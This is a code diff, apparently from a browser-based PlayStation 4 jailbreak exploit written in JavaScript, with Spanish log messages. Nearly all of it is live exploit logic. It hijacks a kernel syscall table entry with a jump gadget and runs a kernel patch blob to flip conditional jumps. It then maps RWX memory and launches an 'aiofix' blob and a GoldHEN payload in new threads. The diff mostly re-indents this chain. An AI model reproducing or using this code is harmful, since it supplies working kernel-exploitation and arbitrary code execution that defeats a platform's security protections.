+                            mark("JMP-RSI-BYTES", gadget + " -> " + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));
+                            const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
+                            const oNarg = kview(sysent).getInt32(SYSENT_NARG);
+                            const oCall = kview(sysent).getBInt(SYSENT_CALL);
+                            const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
+                            const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);
+                            const siteBytes = []; let sitesOk = true;
+                            for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); const b = kvwDv.getUint8(0); siteBytes.push(hx(s) + ":" + b.toString(16)); if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false; }
+                            check("gadget-sysent661-patch-sites-look-right", gadgetOk && sysentOk && sitesOk, "gadget=" + gadgetOk + " sysent=" + sysentOk + " sites=" + sitesOk);
+                            if (gadgetOk && sysentOk && sitesOk) {
+                                const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
+                                const KEXEC_MAP = new int64(0x20100000, 9);
+                                const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
+                                const mapAddr = new int64(mapped.lo, mapped.hi);
+                                if (mapAddr.hi > 0) {
+                                    for (let i = 0; i < kpatch.length; ++i) p.write1(mapAddr.add32(i), kpatch[i]);
+                                    let copied = true;
+                                    for (let i = 0; i < kpatch.length; ++i) if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
+                                    check("blob-rwx-memory-byte-byte", copied, kpatch.length + " bytes");
+                                    if (copied) {
+                                        kview(sysent).setInt32(SYSENT_NARG, 2);
+                                        kview(sysent).setBInt(SYSENT_CALL, gadget);
+                                        kview(sysent).setInt32(SYSENT_THRCNT, 1);
+                                        const armedOk = kview(sysent).getBInt(SYSENT_CALL).low === gadget.low;
+                                        if (armedOk) {
+                                            let rc = -1;
+                                            try { rc = sc(SYS.kexec, mapAddr).i32; }
+                                            finally {
+                                                kview(sysent).setInt32(SYSENT_NARG, oNarg);
+                                                kview(sysent).setBInt(SYSENT_CALL, oCall);
+                                                kview(sysent).setInt32(SYSENT_THRCNT, oThr);
+                                            }
+                                            let allEb = true;
+                                            for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); if (kvwDv.getUint8(0) !== 0xeb) allEb = false; }
+                                            kpatched = rc === 0 && allEb;
+                                            check("gated-site-reads-0xeb", allEb, "");
+                                            check("blob-ran-ring-0", rc === 0, "kexec=" + rc);
+                                            if (kpatched) mark("KERNEL-PATCHED", "sites=" + KPATCH_JMP_SITES.length);
                                         }
-                                        let allEb = true;
-                                        for (const s of KPATCH_JMP_SITES) { new Uint8Array(kvwAb).fill(0); kv.kread(kvwAddr, kernelBase.add32(s), 1); if (kvwDv.getUint8(0) !== 0xeb) allEb = false; }
-                                        kpatched = rc === 0 && allEb;
-                                        check("gated-site-reads-0xeb", allEb, "");
-                                        check("blob-ran-ring-0", rc === 0, "kexec=" + rc);
-                                        if (kpatched) mark("KERNEL-PATCHED", "sites=" + KPATCH_JMP_SITES.length);
+                                    }
+                                }
+                            }
+                        } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
+
+                        // PAYLOAD en dos etapas
+                        let payloadRunning = false;
+                        let aiofixRan = false;
+
+                        if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
+                            if (aiofix && aiofix.length > 0) {
+                                state("running aiofix...", "warn");
+                                const asz = (aiofix.length + 0x3fff) & ~0x3fff;
+                                const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
+                                const aEntry = new int64(am.lo, am.hi);
+                                mark("AIOFIX-MAP", "size=0x" + asz.toString(16) + " rwx=" + aEntry);
+                                if (aEntry.hi > 0) {
+                                    for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
+                                    let aBad = -1;
+                                    for (let i = 0; i < aiofix.length; ++i) if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
+                                    check("aiofix-byte-rwx-memory", aBad < 0, aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
+                                    if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
+                                        const slot = webkitBase.add32(off.wk___imp_pthread_create);
+                                        const fn = p.read8(slot);
+                                        const expect = libkernelBase.add32(off.k_pthread_create);
+                                        const agree = fn.low === expect.low && fn.hi === expect.hi;
+                                        if (agree) {
+                                            const aThr = new ArrayBuffer(8); keepAlive.push(aThr);
+                                            const aThrAddr = bufAddr(aThr);
+                                            new Uint8Array(aThr).fill(0);
+                                            const aRc = callAddr(expect, [aThrAddr, 0, aEntry, 0]).i32;
+                                            const aHandle = new int64(new DataView(aThr).getUint32(0, true), new DataView(aThr).getUint32(4, true));
+                                            aiofixRan = aRc === 0 && aHandle.hi > 0;
+                                            mark("AIOFIX-THREAD", "rc=" + aRc + " handle=" + aHandle);
+                                            check("aiofix-thread-created", aiofixRan, "");
+                                            if (aiofixRan) mark("AIOFIX-RUNNING", "bytes=" + aiofix.length + " entry=" + aEntry);
+                                            mark("AIOFIX-SETTLE", "esperando 1500ms");
+                                            nanosleepMs(1500);
+                                        }
+                                    }
+                                }
+                            } else {
+                                mark("AIOFIX-SKIPPED", "no aiofix cargado");
+                            }
+
+                            if (payload) {
+                                state("running GoldHEN payload...", "warn");
+                                const sz = (payload.length + 0x3fff) & ~0x3fff;
+                                const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
+                                const entry = new int64(m.lo, m.hi);
+                                mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
+                                if (entry.hi > 0) {
+                                    for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
+                                    let bad = -1;
+                                    for (let i = 0; i < payload.length; ++i) if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
+                                    check("byte-payload-rwx-memory", bad < 0, bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
+                                    if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
+                                        const slot = webkitBase.add32(off.wk___imp_pthread_create);
+                                        const fn = p.read8(slot);
+                                        const expect = libkernelBase.add32(off.k_pthread_create);
+                                        const agree = fn.low === expect.low && fn.hi === expect.hi;
+                                        mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
+                                        if (agree) {
+                                            const thr = new ArrayBuffer(8); keepAlive.push(thr);
+                                            const thrAddr = bufAddr(thr);
+                                            new Uint8Array(thr).fill(0);
+                                            const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
+                                            const handle = new int64(new DataView(thr).getUint32(0, true), new DataView(thr).getUint32(4, true));
+                                            payloadRunning = rc === 0 && handle.hi > 0;
+                                            mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
+                                            check("payload-thread-created", payloadRunning, "");
+                                            if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry + " aiofix_before=" + aiofixRan);
+                                        }
                                     }
                                 }
                             }
                         }
-                    } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
 
-                    // PAYLOAD en dos etapas
-                    let payloadRunning = false;
-                    let aiofixRan = false;
-
-                    if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
-                        if (aiofix && aiofix.length > 0) {
-                            state("running aiofix...", "warn");
-                            const asz = (aiofix.length + 0x3fff) & ~0x3fff;
-                            const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
-                            const aEntry = new int64(am.lo, am.hi);
-                            mark("AIOFIX-MAP", "size=0x" + asz.toString(16) + " rwx=" + aEntry);
-                            if (aEntry.hi > 0) {
-                                for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
-                                let aBad = -1;
-                                for (let i = 0; i < aiofix.length; ++i) if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
-                                check("aiofix-byte-rwx-memory", aBad < 0, aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
-                                if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
-                                    const slot = webkitBase.add32(off.wk___imp_pthread_create);
-                                    const fn = p.read8(slot);
-                                    const expect = libkernelBase.add32(off.k_pthread_create);
-                                    const agree = fn.low === expect.low && fn.hi === expect.hi;
-                                    if (agree) {
-                                        const aThr = new ArrayBuffer(8); keepAlive.push(aThr);
-                                        const aThrAddr = bufAddr(aThr);
-                                        new Uint8Array(aThr).fill(0);
-                                        const aRc = callAddr(expect, [aThrAddr, 0, aEntry, 0]).i32;
-                                        const aHandle = new int64(new DataView(aThr).getUint32(0, true), new DataView(aThr).getUint32(4, true));
-                                        aiofixRan = aRc === 0 && aHandle.hi > 0;
-                                        mark("AIOFIX-THREAD", "rc=" + aRc + " handle=" + aHandle);
-                                        check("aiofix-thread-created", aiofixRan, "");
-                                        if (aiofixRan) mark("AIOFIX-RUNNING", "bytes=" + aiofix.length + " entry=" + aEntry);
-                                        mark("AIOFIX-SETTLE", "esperando 1500ms");
-                                        nanosleepMs(1500);
-                                    }
-                                }
-                            }
-                        } else {
-                            mark("AIOFIX-SKIPPED", "no aiofix cargado");
-                        }
-
-                        if (payload) {
-                            state("running GoldHEN payload...", "warn");
-                            const sz = (payload.length + 0x3fff) & ~0x3fff;
-                            const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
-                            const entry = new int64(m.lo, m.hi);
-                            mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
-                            if (entry.hi > 0) {
-                                for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
-                                let bad = -1;
-                                for (let i = 0; i < payload.length; ++i) if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
-                                check("byte-payload-rwx-memory", bad < 0, bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
-                                if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
-                                    const slot = webkitBase.add32(off.wk___imp_pthread_create);
-                                    const fn = p.read8(slot);
-                                    const expect = libkernelBase.add32(off.k_pthread_create);
-                                    const agree = fn.low === expect.low && fn.hi === expect.hi;
-                                    mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
-                                    if (agree) {
-                                        const thr = new ArrayBuffer(8); keepAlive.push(thr);
-                                        const thrAddr = bufAddr(thr);
-                                        new Uint8Array(thr).fill(0);
-                                        const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
-                                        const handle = new int64(new DataView(thr).getUint32(0, true), new DataView(thr).getUint32(4, true));
-                                        payloadRunning = rc === 0 && handle.hi > 0;
-                                        mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
-                                        check("payload-thread-created", payloadRunning, "");
-                                        if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry + " aiofix_before=" + aiofixRan);
-                                    }
-                                }
-                            }
-                        }
+                        mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " aiofix=" + aiofixRan + " payload=" + payloadRunning);
+                        if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 aiofix=" + aiofixRan + " payload=1"); }
+                        else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
+                        else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=0");
+                        else mark("SAFE-TO-EXIT", "karw=1 only");
                     }
-
-                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " aiofix=" + aiofixRan + " payload=" + payloadRunning);
-                    if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 aiofix=" + aiofixRan + " payload=1"); }
-                    else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
-                    else if (jailbroken) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=0");
-                    else mark("SAFE-TO-EXIT", "karw=1 only");
                 }
             }
         }
